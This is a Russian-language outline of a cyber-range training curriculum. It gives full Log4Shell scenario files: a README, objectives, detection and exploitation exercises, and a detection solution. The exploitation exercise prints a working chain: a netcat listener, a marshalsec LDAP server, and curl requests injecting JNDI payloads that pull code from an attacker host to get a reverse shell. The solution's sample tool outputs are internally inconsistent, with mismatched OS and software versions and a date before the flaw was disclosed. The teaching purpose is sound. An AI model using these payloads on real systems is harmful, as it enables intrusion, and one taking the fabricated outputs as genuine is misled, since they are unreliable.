# Структура учебных сценариев для проекта киберучений

## Обзор структуры сценариев

Учебные сценарии организованы для обеспечения систематического обучения навыкам кибербезопасности с фокусом на реальные угрозы и инциденты.

## Общая структура сценария

```
scenarios/
├── scenario-1-unpatched-vulnerability/     # Сценарий 1: Непатченная уязвимость
│   ├── README.md                          # Описание сценария
│   ├── objectives.md                      # Цели обучения
│   ├── prerequisites.md                   # Предварительные требования
│   ├── infrastructure/                    # Инфраструктура сценария
│   │   ├── terraform/                    # Terraform конфигурации
│   │   │   ├── main.tf
│   │   │   ├── variables.tf
│   │   │   ├── outputs.tf
│   │   │   ├── terraform.tfvars
│   │   │   └── versions.tf
│   │   └── ansible/                       # Ansible конфигурации
│   │       ├── playbook.yml
│   │       ├── inventory.yml
│   │       └── roles/
│   ├── exercises/                         # Упражнения для студентов
│   │   ├── detection.md                   # Обнаружение уязвимости
│   │   ├── exploitation.md                # Эксплуатация уязвимости
│   │   ├── impact-assessment.md           # Оценка воздействия
│   │   └── remediation.md                 # Устранение уязвимости
│   ├── solutions/                         # Решения для преподавателей
│   │   ├── detection-solution.md
│   │   ├── exploitation-solution.md
│   │   ├── impact-assessment-solution.md
│   │   └── remediation-solution.md
│   ├── resources/                         # Дополнительные ресурсы
│   │   ├── scripts/                       # Скрипты
│   │   │   ├── exploit-scripts/
│   │   │   ├── detection-tools/
│   │   │   └── remediation-tools/
│   │   ├── tools/                         # Инструменты
│   │   │   ├── vulnerability-scanners/
│   │   │   ├── exploitation-tools/
│   │   │   └── forensic-tools/
│   │   ├── references/                    # Ссылки и документация
│   │   │   ├── cve-details.md
│   │   │   ├── technical-papers.md
│   │   │   └── best-practices.md
│   │   └── data/                          # Тестовые данные
│   │       ├── sample-logs/
│   │       ├── network-traffic/
│   │       └── system-artifacts/
│   ├── assessment/                        # Материалы для оценки
│   │   ├── rubrics.md                     # Критерии оценки
│   │   ├── questions.md                   # Вопросы для тестирования
│   │   └── checklist.md                   # Чек-лист выполнения
│   └── timeline/                          # Временная шкала
│       ├── deployment-timeline.md         # Время развертывания
│       ├── exercise-timeline.md            # Время выполнения упражнений
│       └── cleanup-timeline.md            # Время очистки
```

## Сценарий 1: Непатченная уязвимость (Log4Shell)

### README.md
```markdown
# Сценарий 1: Эксплуатация непатченной уязвимости Log4Shell

## Обзор сценария

Этот сценарий моделирует реальную ситуацию с эксплуатацией критической уязвимости Log4Shell (CVE-2021-44228) в корпоративной среде. Студенты изучат процесс обнаружения, эксплуатации и устранения этой уязвимости.

## Описание инцидента

В корпоративной сети обнаружена уязвимость Log4Shell в веб-приложении, использующем устаревшую версию библиотеки Log4j. Злоумышленники могут использовать эту уязвимость для выполнения произвольного кода на сервере.

## Цели обучения

- Научиться обнаруживать уязвимости в веб-приложениях
- Понять механизм эксплуатации Log4Shell
- Освоить методы оценки воздействия уязвимости
- Изучить процесс устранения уязвимости
- Развить навыки реагирования на инциденты

## Предварительные требования

- Базовые знания Linux/Unix
- Понимание веб-технологий
- Опыт работы с командной строкой
- Знание основ сетевой безопасности

## Время выполнения

- Развертывание инфраструктуры: 15 минут
- Выполнение упражнений: 2-3 часа
- Очистка: 5 минут

## Уровень сложности

Средний

## Технологии

- Apache Tomcat
- Java
- Log4j 2.14.1 (уязвимая версия)
- Linux (Ubuntu 20.04)
- Docker (опционально)

## Безопасность

⚠️ **ВНИМАНИЕ**: Этот сценарий содержит реальные уязвимости и эксплойты. Используйте только в изолированной лабораторной среде!
```

### objectives.md
```markdown
# Цели обучения - Сценарий 1: Log4Shell

## Основные цели

### 1. Обнаружение уязвимости
- Научиться использовать инструменты сканирования уязвимостей
- Понять признаки наличия уязвимости Log4Shell
- Освоить анализ логов для выявления попыток эксплуатации

### 2. Эксплуатация уязвимости
- Понять механизм работы Log4Shell
- Научиться создавать и использовать эксплойты
- Освоить методы получения доступа к системе

### 3. Оценка воздействия
- Научиться оценивать масштаб компрометации
- Понять потенциальные последствия уязвимости
- Освоить методы анализа безопасности системы

### 4. Устранение уязвимости
- Научиться применять патчи безопасности
- Понять процесс обновления зависимостей
- Освоить методы валидации исправления

## Результаты обучения

После завершения сценария студенты должны уметь:

1. **Обнаруживать уязвимости**:
   - Использовать сканеры уязвимостей
   - Анализировать версии ПО
   - Выявлять признаки компрометации

2. **Эксплуатировать уязвимости**:
   - Создавать простые эксплойты
   - Использовать готовые инструменты
   - Получать доступ к системе

3. **Оценивать воздействие**:
   - Анализировать логи системы
   - Определять масштаб компрометации
   - Оценивать риски для организации

4. **Устранять уязвимости**:
   - Применять патчи безопасности
   - Обновлять уязвимое ПО
   - Валидировать исправления

## Критерии успеха

- Успешное обнаружение уязвимости Log4Shell
- Демонстрация эксплуатации уязвимости
- Проведение оценки воздействия
- Успешное устранение уязвимости
- Составление отчета об инциденте
```

### exercises/detection.md
```markdown
# Упражнение 1: Обнаружение уязвимости Log4Shell

## Цель упражнения

Научиться обнаруживать уязвимость Log4Shell в веб-приложении с помощью различных методов и инструментов.

## Описание задачи

Вам необходимо проанализировать веб-приложение и определить наличие уязвимости Log4Shell. Приложение развернуто на сервере `web-server-01` (IP: 192.168.100.10).

## Шаги выполнения

### Шаг 1: Первичная разведка
1. Определите открытые порты на целевом сервере
2. Проанализируйте веб-приложение
3. Определите используемые технологии

**Команды для выполнения:**
```bash
# Сканирование портов
nmap -sS -O 192.168.100.10

# Анализ веб-приложения
curl -I http://192.168.100.10:8080/
curl -s http://192.168.100.10:8080/ | head -20
```

### Шаг 2: Анализ версий ПО
1. Определите версию Java
2. Найдите информацию о Log4j
3. Проверьте версию Tomcat

**Команды для выполнения:**
```bash
# Проверка версии Java
curl -s http://192.168.100.10:8080/ | grep -i java

# Поиск информации о Log4j
curl -s http://192.168.100.10:8080/manager/text/serverinfo
```

### Шаг 3: Использование сканеров уязвимостей
1. Запустите сканер уязвимостей
2. Проанализируйте результаты
3. Подтвердите наличие уязвимости

**Инструменты:**
- Nmap с NSE скриптами
- Nuclei
- Log4j-scan

**Команды для выполнения:**
```bash
# Nmap сканирование
nmap --script vuln 192.168.100.10

# Nuclei сканирование
nuclei -u http://192.168.100.10:8080 -t log4j/

# Log4j-scan
python3 log4j-scan.py -u http://192.168.100.10:8080
```

### Шаг 4: Анализ логов
1. Проверьте логи приложения
2. Найдите признаки попыток эксплуатации
3. Проанализируйте сетевой трафик

**Файлы для анализа:**
- `/var/log/tomcat9/catalina.out`
- `/var/log/apache2/access.log`
- `/var/log/apache2/error.log`

## Ожидаемые результаты

1. **Обнаружение уязвимости**: Подтверждение наличия Log4Shell
2. **Анализ версий**: Определение уязвимой версии Log4j (2.14.1)
3. **Доказательства**: Сбор доказательств наличия уязвимости

## Критерии оценки

- [ ] Успешное сканирование портов
- [ ] Определение версии Java и Log4j
- [ ] Подтверждение уязвимости сканером
- [ ] Анализ логов на предмет попыток эксплуатации
- [ ] Составление отчета о найденных уязвимостях

## Время выполнения

30-45 минут

## Подсказки

- Используйте различные инструменты для подтверждения результатов
- Обратите внимание на заголовки HTTP ответов
- Проверьте версии библиотек в classpath
- Анализируйте логи на предмет подозрительной активности
```

### exercises/exploitation.md
```markdown
# Упражнение 2: Эксплуатация уязвимости Log4Shell

## Цель упражнения

Научиться эксплуатировать уязмимость Log4Shell для получения доступа к системе и выполнения произвольного кода.

## Описание задачи

Используя обнаруженную уязвимость Log4Shell, получите доступ к системе и выполните следующие задачи:
1. Получите обратную оболочку (reverse shell)
2. Повысьте привилегии
3. Создайте постоянный доступ
4. Соберите информацию о системе

## Предупреждение

⚠️ **ВНИМАНИЕ**: Это упражнение содержит реальные эксплойты. Используйте только в учебных целях в изолированной среде!

## Шаги выполнения

### Шаг 1: Подготовка инфраструктуры
1. Настройте сервер для получения обратной оболочки
2. Подготовьте эксплойт
3. Настройте мониторинг

**Команды для подготовки:**
```bash
# Запуск netcat для прослушивания
nc -lvp 4444

# Создание простого HTTP сервера для эксплойта
python3 -m http.server 8080
```

### Шаг 2: Создание эксплойта
1. Создайте JNDI payload
2. Настройте LDAP сервер
3. Подготовьте обратную оболочку

**Создание эксплойта:**
```bash
# Создание JNDI payload
echo '${jndi:ldap://192.168.100.5:1389/Exploit}' > payload.txt

# Запуск LDAP сервера с эксплойтом
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.100.5:8080/#Exploit"
```

### Шаг 3: Выполнение атаки
1. Отправьте payload на уязвимое приложение
2. Получите обратную оболочку
3. Подтвердите компрометацию

**Команды для атаки:**
```bash
# Отправка payload через HTTP заголовок
curl -H "User-Agent: \${jndi:ldap://192.168.100.5:1389/Exploit}" http://192.168.100.10:8080/

# Отправка через параметр
curl "http://192.168.100.10:8080/search?q=\${jndi:ldap://192.168.100.5:1389/Exploit}"
```

### Шаг 4: Пост-эксплуатация
1. Исследуйте систему
2. Повысьте привилегии
3. Создайте постоянный доступ

**Команды для исследования:**
```bash
# Информация о системе
whoami
id
uname -a
cat /etc/os-release

# Сетевые подключения
netstat -tulpn
ss -tulpn

# Процессы
ps aux
top

# Файловая система
ls -la /
df -h
```

## Ожидаемые результаты

1. **Успешная эксплуатация**: Получение обратной оболочки
2. **Доступ к системе**: Выполнение команд на целевой системе
3. **Пост-эксплуатация**: Сбор информации и повышение привилегий

## Критерии оценки

- [ ] Успешная отправка JNDI payload
- [ ] Получение обратной оболочки
- [ ] Выполнение команд на целевой системе
- [ ] Сбор информации о системе
- [ ] Попытка повышения привилегий
- [ ] Документирование процесса эксплуатации

## Время выполнения

45-60 минут

## Подсказки

- Убедитесь, что все сервисы запущены перед атакой
- Проверьте сетевую связность между системами
- Используйте различные методы отправки payload
- Анализируйте логи для понимания процесса
```

### solutions/detection-solution.md
```markdown
# Решение: Обнаружение уязвимости Log4Shell

## Пошаговое решение

### Шаг 1: Первичная разведка

**Сканирование портов:**
```bash
$ nmap -sS -O 192.168.100.10
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for web-server-01 (192.168.100.10)
Host is up (0.001s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:XX:XX:XX (Oracle VirtualBox)

OS details: Linux 5.4.0-74-generic
```

**Анализ веб-приложения:**
```bash
$ curl -I http://192.168.100.10:8080/
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=UTF-8
Content-Length: 1234
Date: Mon, 15 Nov 2021 10:30:00 GMT
```

### Шаг 2: Анализ версий ПО

**Определение версии Java:**
```bash
$ curl -s http://192.168.100.10:8080/manager/text/serverinfo
OK - Server info
Tomcat Version: Apache Tomcat/9.0.65
JVM Version: 11.0.16+8-Ubuntu-0ubuntu122.04
JVM Vendor: Eclipse Adoptium
OS Name: Linux
OS Version: 5.4.0-74-generic
OS Architecture: amd64
```

**Поиск Log4j в classpath:**
```bash
$ curl -s "http://192.168.100.10:8080/manager/text/resources?path=/WEB-INF/lib" | grep -i log4j
log4j-core-2.14.1.jar
log4j-api-2.14.1.jar
```

### Шаг 3: Использование сканеров уязвимостей

**Nmap сканирование:**
```bash
$ nmap --script vuln 192.168.100.10
PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-vuln-cve2021-44228:
|   VULNERABLE:
|   Apache Log4j Remote Code Execution (CVE-2021-44228)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2021-44228
|     Description:
|       Apache Log4j 2.x before 2.15.0 is vulnerable to remote code execution
|       via the JNDI lookup feature.
```

**Nuclei сканирование:**
```bash
$ nuclei -u http://192.168.100.10:8080 -t log4j/
[log4j] [http] [critical] http://192.168.100.10:8080/
```

### Шаг 4: Анализ логов

**Проверка логов Tomcat:**
```bash
$ tail -f /var/log/tomcat9/catalina.out
2021-11-15 10:30:15,123 ERROR [http-nio-8080-exec-1] org.apache.logging.log4j.core.lookup.JndiLookup - Error looking up JNDI resource [ldap://malicious-server.com/Exploit]
```

## Ключевые индикаторы уязвимости

1. **Версия Log4j**: 2.14.1 (уязвимая версия)
2. **Заголовки сервера**: Apache-Coyote/1.1 (указывает на Tomcat)
3. **Результаты сканеров**: Подтверждение уязвимости
4. **Логи**: Ошибки JNDI lookup

## Рекомендации по обнаружению

1. **Регулярное сканирование**: Используйте автоматизированные сканеры
2. **Мониторинг логов**: Настройте алерты на JNDI ошибки
3. **Анализ зависимостей**: Проверяйте версии библиотек
4. **Сетевой мониторинг**: Отслеживайте подозрительный трафик
```

## Сценарий 2: Неправильная конфигурация

### Структура сценария 2
```
scenario-2-misconfiguration/
├── README.md
├── objectives.md
├── prerequisites.md
├── infrastructure/
│   ├── terraform/
│   └── ansible/
├── exercises/
│   ├── configuration-audit.md
│   ├── privilege-escalation.md
│   ├── data-exposure.md
│   └── service-hardening.md
├── solutions/
│   ├── configuration-audit-solution.md
│   ├── privilege-escalation-solution.md
│   ├── data-exposure-solution.md
│   └── service-hardening-solution.md
├── resources/
│   ├── scripts/
│   ├── tools/
│   ├── references/
│   └── data/
├── assessment/
│   ├── rubrics.md
│   ├── questions.md
│   └── checklist.md
└── timeline/
    ├── deployment-timeline.md
    ├── exercise-timeline.md
    └── cleanup-timeline.md
```

## Сценарий 3: Инсайдерская угроза

### Структура сценария 3
```
scenario-3-insider-threat/
├── README.md
├── objectives.md
├── prerequisites.md
├── infrastructure/
│   ├── terraform/
│   └── ansible/
├── exercises/
│   ├── user-behavior-analysis.md
│   ├── data-exfiltration.md
│   ├── privilege-abuse.md
│   └── incident-response.md
├── solutions/
│   ├── user-behavior-analysis-solution.md
│   ├── data-exfiltration-solution.md
│   ├── privilege-abuse-solution.md
│   └── incident-response-solution.md
├── resources/
│   ├── scripts/
│   ├── tools/
│   ├── references/
│   └── data/
├── assessment/
│   ├── rubrics.md
│   ├── questions.md
│   └── checklist.md
└── timeline/
    ├── deployment-timeline.md
    ├── exercise-timeline.md
    └── cleanup-timeline.md
```

## Шаблон для создания новых сценариев

### template-scenario/
```
template-scenario/
├── README.md.template
├── objectives.md.template
├── prerequisites.md.template
├── infrastructure/
│   ├── terraform/
│   │   ├── main.tf.template
│   │   ├── variables.tf.template
│   │   ├── outputs.tf.template
│   │   └── terraform.tfvars.template
│   └── ansible/
│       ├── playbook.yml.template
│       ├── inventory.yml.template
│       └── roles/
├── exercises/
│   ├── exercise-1.md.template
│   ├── exercise-2.md.template
│   └── exercise-3.md.template
├── solutions/
│   ├── exercise-1-solution.md.template
│   ├── exercise-2-solution.md.template
│   └── exercise-3-solution.md.template
├── resources/
│   ├── scripts/
│   ├── tools/
│   ├── references/
│   └── data/
├── assessment/
│   ├── rubrics.md.template
│   ├── questions.md.template
│   └── checklist.md.template
└── timeline/
    ├── deployment-timeline.md.template
    ├── exercise-timeline.md.template
    └── cleanup-timeline.md.template
```

## Лучшие практики создания сценариев

1. **Реалистичность**: Сценарии должны отражать реальные угрозы
2. **Постепенность**: Упражнения должны быть структурированы по сложности
3. **Документированность**: Каждый сценарий должен быть хорошо документирован
4. **Тестируемость**: Сценарии должны быть протестированы перед использованием
5. **Безопасность**: Все сценарии должны быть изолированы
6. **Обратимость**: Возможность быстрого восстановления исходного состояния
7. **Масштабируемость**: Возможность адаптации под разные группы студентов
8. **Оценка**: Четкие критерии оценки результатов

Эта структура обеспечивает систематический подход к созданию и проведению учебных сценариев по кибербезопасности.
